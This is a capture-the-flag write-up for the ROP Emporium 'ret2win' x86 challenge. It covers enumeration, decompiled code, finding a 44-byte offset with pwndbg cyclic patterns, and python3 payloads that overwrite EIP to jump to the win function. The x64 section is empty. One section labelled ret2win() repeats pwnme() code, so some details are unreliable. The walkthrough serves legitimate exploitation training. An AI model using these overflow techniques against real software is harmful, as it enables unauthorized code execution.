---
description: 09/22/2023
---

# â˜º ret2win

## Challenge

{% embed url="https://ropemporium.com/challenge/ret2win.html" %}

## x86 Challenge

### Enumeration

`file`:

{% code overflow="wrap" %}
```
file ret2win32                                                                                  ret2win32: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=e1596c11f85b3ed0881193fe40783e1da685b851, not stripped
```
{% endcode %}

* 32-bit
* Dynamically linked to `libc`
* Not stripped

checksec:

{% code overflow="wrap" %}
```
Arch:     i386-32-little                                                                                                         RELRO:    Partial RELRO                                                                                                          Stack:    No canary found                                                                                                        NX:       NX enabled                                                                                                             PIE:      No PIE (0x8048000)
```
{% endcode %}

* Partial RELRO
* NX Enabled

### Reversing

`main()`:

```c
undefined4 main(void)

{
  setvbuf(stdout,(char *)0x0,2,0);
  puts("ret2win by ROP Emporium");
  puts("x86\n");
  pwnme();
  puts("\nExiting");
  return 0;
}
```

`pwnme()`:

```c
void pwnme(void)

{
  undefined local_2c [40];
  
  memset(local_2c,0,0x20);
  puts(
      "For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffe r!"
      );
  puts("What could possibly go wrong?");
  puts(
      "You there, may I have your input please? And don\'t worry about null bytes, we\'re using read ()!\n"
      );
  printf("> ");
  read(0,local_2c,0x38);
  puts("Thank you!");
  return;
}
```

<figure><img src="../../.gitbook/assets/image (147).png" alt=""><figcaption></figcaption></figure>

**EBP address:** `0x080485ad`

`ret2win()`:

```c
void pwnme(void)

{
  undefined buffer [40];
  
  memset(buffer,0,32);
  puts(
      "For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffe r!"
      );
  puts("What could possibly go wrong?");
  puts(
      "You there, may I have your input please? And don\'t worry about null bytes, we\'re using read ()!\n"
      );
  printf("> ");
  read(0,buffer,56);
  puts("Thank you!");
  return;
}
```

* 32-byte buffer&#x20;
* ;)

**What about our offset from `EBP`?**

* Hex `0x2C` is `44` converted to decimal

### Debugging with `pwndbg`

**Let's find out which characters made it into the instruction pointer and at what point it began overwriting data:**

```
cyclic 100
```

Sent to the input:

```
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
```

<figure><img src="../../.gitbook/assets/image (148).png" alt=""><figcaption></figcaption></figure>

* 'laaa' overwrote the `EIP`

**Confirming `EBP` offset:**

```
cyclic -l laaa
Finding cyclic pattern of 4 bytes: b'laaa' (hex: 0x6c616161)
Found offset at offset 44
```

This ended up crashing our program because of a segmentation fault. This is simply because we exceeded the 32-byte buffer and wrote outside of the memory allocated.

Further confirming our findings above of `44`.

So, at 44-bytes, we are able to overwrite the instruction pointer (`EIP`).

**Grabbing the address of `pwnme(`):**

```
disass pwnme
 0x080485ad <+0>:     push   ebp
```

* `0x080485ad`
* We now will place this in little-endian format for our payload

```
\xad\x85\x04\x08
```

**Utilizing python3, we can jump to `pwnme()` once more and see that in the result of our execution:**

<pre><code><strong>python3 -c "import sys; sys.stdout.buffer.write(b'A'*44+b'\xad\x85\x04\x08')"  > payload
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (149).png" alt=""><figcaption><p>How cool is that? Now, let's get that flag.</p></figcaption></figure>

**Utilizing the similar method above, let's grab the address of `ret2win()`:**

```
disass ret2win 
Dump of assembler code for function ret2win:
   0x0804862c <+0>:     push   ebp
```

* `0x0804862c`
* Placing in little-endian format for our payload

```
\x2c\x86\x04\x08
```

**Utilizing python3, we can jump to `ret2win()` once more and see that in the result of our execution and obtain our flag:**

```
python3 -c "import sys; sys.stdout.buffer.write(b'A'*44+b'\x2c\x86\x04\x08')"  > payload
```

<figure><img src="../../.gitbook/assets/image (150).png" alt=""><figcaption></figcaption></figure>

## x64 Challenge
